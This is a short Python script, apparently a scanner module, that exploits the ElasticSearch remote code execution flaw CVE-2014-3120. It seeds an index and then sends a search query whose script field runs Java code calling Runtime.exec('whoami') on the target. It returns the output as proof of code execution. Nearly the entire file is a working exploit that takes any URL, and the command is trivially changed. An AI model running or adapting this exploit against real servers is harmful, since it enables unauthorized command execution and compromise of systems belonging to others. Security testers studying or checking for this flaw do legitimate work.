#!/usr/bin/env python
# coding: utf-8
# Date  : 2025-08-05 15:10
# Author: b4zinga
# Email : b4zinga@outlook.com
# Func  : Exploit remote code execution vulnerability in ElasticSearch (CVE-2014-3120)

import json
import requests
from lib.log import logger
from typing import Optional

def run(url: str) -> Optional[str]:
    """Exploit remote code execution vulnerability in ElasticSearch (CVE-2014-3120)."""
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    target_url = f"{url}:9200/website/blog/"

    try:
        # Create initial data
        logger.info(f"Creating initial data at {target_url}")
        response = requests.post(target_url, headers=headers, data="""{"name":"test"}""", timeout=5, verify=False)
        # logger.info(f"Initial response: {response.text}")

        # Execute remote code
        data = {
            "size": 1,
            "query": {
                "filtered": {
                    "query": {
                        "match_all": {}
                    }
                }
            },
            "script_fields": {
                "command": {
                    "script": "import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"whoami\").getInputStream()).useDelimiter(\"\\\\A\").next();"
                }
            }
        }
        logger.info("Executing remote code")
        response = requests.post(f"{url}:9200/_search?pretty", headers=headers, data=json.dumps(data), timeout=5, verify=False)
        if response.status_code == 200:
            result = json.loads(response.text)
            command_output = result['hits']['hits'][0]['fields']['command']
            logger.success("ElasticSearch Remote Code Exec ~")
            logger.info(f"Command output: {command_output}")
            return "ElasticSearch Remote Code Exec ~"
        logger.warning(f"Failed, status code: {response.status_code}")
        return None
    except requests.RequestException as e:
        logger.error(f"Request failed: {str(e)}")
        return None
    except json.JSONDecodeError as e:
        logger.error(f"JSON decode failed: {str(e)}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}")
        return None

if __name__ == "__main__":
    # Example usage
    print(run("localhost"))